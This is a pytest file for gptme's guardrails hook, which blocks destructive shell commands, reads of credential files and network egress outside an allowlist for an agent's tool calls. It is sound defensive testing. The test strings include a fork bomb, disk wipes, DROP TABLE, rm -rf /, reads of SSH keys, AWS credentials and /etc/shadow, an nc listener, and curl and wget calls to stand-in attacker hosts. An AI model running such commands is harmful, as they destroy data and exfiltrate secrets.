"""Tests for the guardrails hook policy checks (gptme#3598).

Validates the three independent check layers:
1. Shell policy — destructive patterns blocked regardless of allowlist status
2. Secret-read denial — sensitive credential paths refused by any tool
3. Egress allowlist — non-allowlisted network egress blocked (when allowlist active)
"""

from __future__ import annotations

from gptme.hooks.confirm import ConfirmAction, ConfirmationResult
from gptme.hooks.guardrails import (
    _check_egress,
    _check_secret_read,
    _check_shell_policy,
    guardrails_hook,
)
from gptme.tools.base import ToolUse

# ── Shell policy tests ──────────────────────────────────────────────────────────


class TestShellPolicy:
    def test_fork_bomb_blocked(self):
        assert _check_shell_policy(":(){ :|:& };:") is not None

    def test_raw_disk_write_blocked(self):
        assert _check_shell_policy("dd if=/dev/zero of=/dev/sda bs=1M") is not None

    def test_raw_disk_redirect_blocked(self):
        assert _check_shell_policy("cat image.bin > /dev/nvme0") is not None

    def test_drop_table_blocked(self):
        assert _check_shell_policy("psql -c 'DROP TABLE users'") is not None

    def test_drop_database_blocked(self):
        assert _check_shell_policy("DROP DATABASE production") is not None

    def test_truncate_table_blocked(self):
        assert _check_shell_policy("TRUNCATE TABLE logs") is not None

    def test_chmod_000_blocked(self):
        assert _check_shell_policy("chmod 000 /etc/passwd") is not None

    def test_chmod_r_000_blocked(self):
        assert _check_shell_policy("chmod -R 000 /") is not None

    def test_crypto_miner_blocked(self):
        assert _check_shell_policy("./xmrig --pool pool.minexmr.com") is not None

    def test_safe_rm_allowed(self):
        assert _check_shell_policy("rm -f /tmp/scratch.txt") is None

    def test_ls_allowed(self):
        assert _check_shell_policy("ls -la /tmp") is None

    def test_git_commit_allowed(self):
        assert _check_shell_policy("git commit -m 'fix: update README'") is None

    def test_curl_allowed_by_shell_policy(self):
        # curl is NOT a shell policy violation — it's an egress check
        assert _check_shell_policy("curl https://example.com") is None

    def test_case_insensitive_drop_table(self):
        assert _check_shell_policy("drop table users") is not None


# ── Secret-read denial tests ───────────────────────────────────────────────────


class TestSecretReadDenial:
    def test_ssh_private_key_blocked(self):
        assert _check_secret_read("cat ~/.ssh/id_rsa") is not None

    def test_ssh_ed25519_blocked(self):
        assert _check_secret_read("~/.ssh/id_ed25519") is not None

    def test_aws_credentials_blocked(self):
        assert _check_secret_read("cat ~/.aws/credentials") is not None

    def test_pem_file_blocked(self):
        assert _check_secret_read("openssl x509 -in server.pem -text") is not None

    def test_key_file_blocked(self):
        assert _check_secret_read("cat /etc/ssl/private/server.key") is not None

    def test_shadow_blocked(self):
        assert _check_secret_read("cat /etc/shadow") is not None

    def test_env_file_blocked(self):
        assert _check_secret_read("cat .env") is not None

    def test_env_local_blocked(self):
        assert _check_secret_read("cat .env.local") is not None

    def test_secrets_yaml_blocked(self):
        assert _check_secret_read("cat secrets.yaml") is not None

    def test_credentials_json_blocked(self):
        assert _check_secret_read("credentials.json") is not None

    def test_ssh_config_allowed(self):
        # ~/.ssh/config and known_hosts are not secret
        assert _check_secret_read("cat ~/.ssh/config") is None

    def test_ssh_known_hosts_allowed(self):
        assert _check_secret_read("cat ~/.ssh/known_hosts") is None

    def test_normal_file_allowed(self):
        assert _check_secret_read("cat /tmp/result.txt") is None

    def test_readme_allowed(self):
        assert _check_secret_read("README.md") is None


# ── Egress allowlist tests ─────────────────────────────────────────────────────


class TestEgressAllowlist:
    def test_no_allowlist_means_inactive(self):
        # Without GPTME_EGRESS_ALLOWLIST, the egress check is inactive
        assert _check_egress("curl https://attacker.com/exfil", allowlist=[]) is None

    def test_allowlisted_host_allowed(self):
        assert (
            _check_egress(
                "curl https://api.openai.com/v1/chat", allowlist=["api.openai.com"]
            )
            is None
        )

    def test_subdomain_of_allowlisted_host_allowed(self):
        assert (
            _check_egress(
                "curl https://sub.example.com/data", allowlist=["example.com"]
            )
            is None
        )

    def test_non_allowlisted_host_blocked(self):
        result = _check_egress(
            "curl https://attacker.com/steal", allowlist=["example.com"]
        )
        assert result is not None
        assert "attacker.com" in result

    def test_non_network_command_not_blocked(self):
        assert _check_egress("ls /tmp", allowlist=["example.com"]) is None

    def test_wget_to_non_allowlisted_blocked(self):
        result = _check_egress(
            "wget https://evil.net/payload", allowlist=["trusted.org"]
        )
        assert result is not None

    def test_nc_without_url_blocked_when_allowlist_active(self):
        # nc with no parseable URL is conservatively blocked when allowlist is active
        result = _check_egress("nc -lvp 4444", allowlist=["safe.example.com"])
        assert result is not None


# ── Full hook integration ──────────────────────────────────────────────────────


class TestGuardrailsHook:
    """Integration tests for the guardrails hook in shadow and enforce modes."""

    def _tool_use(self, tool: str, content: str) -> ToolUse:
        return ToolUse(tool=tool, args=[], content=content)

    def test_shadow_mode_does_not_block(self, monkeypatch):
        monkeypatch.setenv("GPTME_GUARDRAILS", "shadow")
        tu = self._tool_use("shell", ":(){ :|:& };:")
        result = guardrails_hook(tu)
        # Shadow mode returns None (falls through)
        assert result is None

    def test_enforce_mode_blocks_fork_bomb(self, monkeypatch):
        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
        tu = self._tool_use("shell", ":(){ :|:& };:")
        result = guardrails_hook(tu)
        assert isinstance(result, ConfirmationResult)
        assert result.action == ConfirmAction.SKIP
        assert "fork bomb" in (result.message or "")

    def test_enforce_mode_blocks_secret_read_via_read_tool(self, monkeypatch):
        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
        tu = self._tool_use("read", "~/.ssh/id_rsa")
        result = guardrails_hook(tu)
        assert isinstance(result, ConfirmationResult)
        assert result.action == ConfirmAction.SKIP

    def test_off_mode_never_blocks(self, monkeypatch):
        monkeypatch.setenv("GPTME_GUARDRAILS", "off")
        tu = self._tool_use("shell", "rm -rf /")
        result = guardrails_hook(tu)
        assert result is None

    def test_safe_command_not_blocked_in_enforce_mode(self, monkeypatch):
        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
        tu = self._tool_use("shell", "ls -la /tmp")
        result = guardrails_hook(tu)
        assert result is None

    def test_preview_used_when_provided(self, monkeypatch):
        """Preview (full bg context) is checked, not just tool_use.content."""
        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
        # tool_use.content is innocent, but preview reveals the dangerous context
        tu = self._tool_use("shell", "ls")
        result = guardrails_hook(tu, preview="cat ~/.ssh/id_rsa\nbg ls")
        assert isinstance(result, ConfirmationResult)
        assert result.action == ConfirmAction.SKIP

    def test_enforce_mode_blocks_egress_to_non_allowlisted(self, monkeypatch):
        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
        monkeypatch.setenv("GPTME_EGRESS_ALLOWLIST", "api.openai.com")
        tu = self._tool_use("shell", "curl https://attacker.com/steal?data=secret")
        result = guardrails_hook(tu)
        assert isinstance(result, ConfirmationResult)
        assert result.action == ConfirmAction.SKIP

    def test_enforce_mode_allows_egress_to_allowlisted(self, monkeypatch):
        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
        monkeypatch.setenv("GPTME_EGRESS_ALLOWLIST", "api.openai.com")
        tu = self._tool_use("shell", "curl https://api.openai.com/v1/chat/completions")
        result = guardrails_hook(tu)
        assert result is None
